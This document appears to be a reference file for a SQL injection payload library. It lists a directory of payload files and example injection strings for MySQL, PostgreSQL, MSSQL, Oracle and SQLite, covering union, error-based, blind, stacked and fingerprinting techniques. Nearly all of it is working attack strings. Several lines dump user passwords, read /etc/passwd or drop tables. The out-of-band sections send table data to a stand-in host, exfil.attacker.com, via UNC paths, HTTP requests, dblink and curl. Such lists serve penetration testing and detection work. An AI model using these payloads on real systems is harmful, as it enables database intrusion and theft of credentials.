# Payload Signatures

## Directory Structure
```
signatures/payloads/
├── union/
│   ├── mysql.txt
│   ├── postgres.txt
│   ├── mssql.txt
│   ├── oracle.txt
│   └── sqlite.txt
├── error/
│   ├── mysql.txt
│   ├── postgres.txt
│   ├── mssql.txt
│   ├── oracle.txt
│   └── sqlite.txt
├── time/
│   ├── mysql.txt
│   ├── postgres.txt
│   ├── mssql.txt
│   ├── oracle.txt
│   └── sqlite.txt
├── blind/
│   ├── boolean.txt
│   └── time.txt
├── stacked/
│   ├── mysql.txt
│   ├── postgres.txt
│   ├── mssql.txt
│   └── oracle.txt
├── oob/
│   ├── mysql_dns.txt
│   ├── mysql_http.txt
│   ├── postgres_dblink.txt
│   ├── mssql_xp.txt
│   └── oracle_utl.txt
├── fingerprint/
│   ├── mysql.txt
│   ├── postgres.txt
│   ├── mssql.txt
│   ├── oracle.txt
│   └── sqlite.txt
└── version/
    ├── mysql.txt
    ├── postgres.txt
    ├── mssql.txt
    ├── oracle.txt
    └── sqlite.txt
```

## Example Payloads

### Union (MySQL)
```sql
' UNION SELECT NULL-- 
' UNION SELECT 1,2,3-- 
' UNION ALL SELECT NULL,NULL,NULL-- 
' UNION SELECT 1,@@VERSION,3-- 
' UNION SELECT 1,USER(),3-- 
' UNION SELECT 1,DATABASE(),3-- 
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- 
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- 
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- 
' UNION SELECT id,username,password FROM users-- 
```

### Error-Based (MySQL)
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))-- 
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT USER()), 0x7e), 1)-- 
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- 
' AND EXP(~(SELECT * FROM (SELECT VERSION()) a))-- 
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT VERSION()) a))-- 
```

### Time-Based (MySQL)
```sql
' AND (SELECT SLEEP(5))-- 
' OR (SELECT SLEEP(5))-- 
' AND IF(1=1, SLEEP(5), 0)-- 
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
' AND BENCHMARK(10000000, MD5(1))-- 
```

### Boolean Blind (Generic)
```sql
' AND 1=1-- 
' AND 1=2-- 
' AND (SELECT 1 FROM dual WHERE 1=1)-- 
' AND SUBSTRING(VERSION(),1,1)='5'-- 
' AND ASCII(SUBSTRING((SELECT USER()),1,1))>64-- 
```

### Stacked Queries (MySQL)
```sql
'; SELECT SLEEP(5)-- 
'; DROP TABLE temp-- 
'; CREATE TABLE temp (id INT)-- 
'; INSERT INTO temp VALUES (1)-- 
'; SELECT * INTO OUTFILE '/tmp/out.txt' FROM users-- 
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE temp-- 
```

### OOB DNS Exfiltration (MySQL)
```sql
' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT VERSION()), '.exfil.attacker.com\\\\share')))-- 
' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT USER()), '.exfil.attacker.com\\\\share')))-- 
'; SELECT * INTO OUTFILE '\\\\exfil.attacker.com\\share\\data.txt' FROM users-- 
```

### OOB HTTP Exfiltration (MSSQL)
```sql
'; DECLARE @url VARCHAR(8000); SET @url = 'http://exfil.attacker.com/collect?data=' + (SELECT TOP 1 password FROM users); EXEC sp_OACreate 'MSXML2.XMLHTTP', @obj OUT; EXEC sp_OAMethod @obj, 'open', NULL, 'GET', @url, false; EXEC sp_OAMethod @obj, 'send';--
'; EXEC xp_dirtree '\\exfil.attacker.com\share'-- 
```

### OOB (PostgreSQL)
```sql
'; CREATE EXTENSION dblink; SELECT dblink_connect('host=exfil.attacker.com dbname=postgres user=postgres password=secret'); SELECT dblink_exec('SELECT * FROM users');--
'; COPY (SELECT * FROM users) TO PROGRAM 'curl -X POST -d @- http://exfil.attacker.com/collect';--
```

### Fingerprinting
```sql
-- MySQL
' AND (SELECT 1 FROM DUAL)-- 
' AND @@VERSION LIKE '5.%'-- 

-- PostgreSQL
' AND (SELECT 1)-- 
' AND VERSION() LIKE 'PostgreSQL%'-- 

-- MSSQL
' AND (SELECT 1)-- 
' AND @@VERSION LIKE 'Microsoft%'-- 

-- Oracle
' AND (SELECT 1 FROM DUAL)-- 
' AND (SELECT BANNER FROM V$VERSION WHERE ROWNUM=1) LIKE 'Oracle%'-- 

-- SQLite
' AND (SELECT 1)-- 
' AND SQLITE_VERSION() LIKE '3.%'-- 
```

### Version Extraction
```sql
-- MySQL
' UNION SELECT @@VERSION-- 
' UNION SELECT VERSION()-- 

-- PostgreSQL
' UNION SELECT VERSION()-- 

-- MSSQL
' UNION SELECT @@VERSION-- 

-- Oracle
' UNION SELECT BANNER FROM V$VERSION WHERE ROWNUM=1-- 

-- SQLite
' UNION SELECT SQLITE_VERSION()-- 
```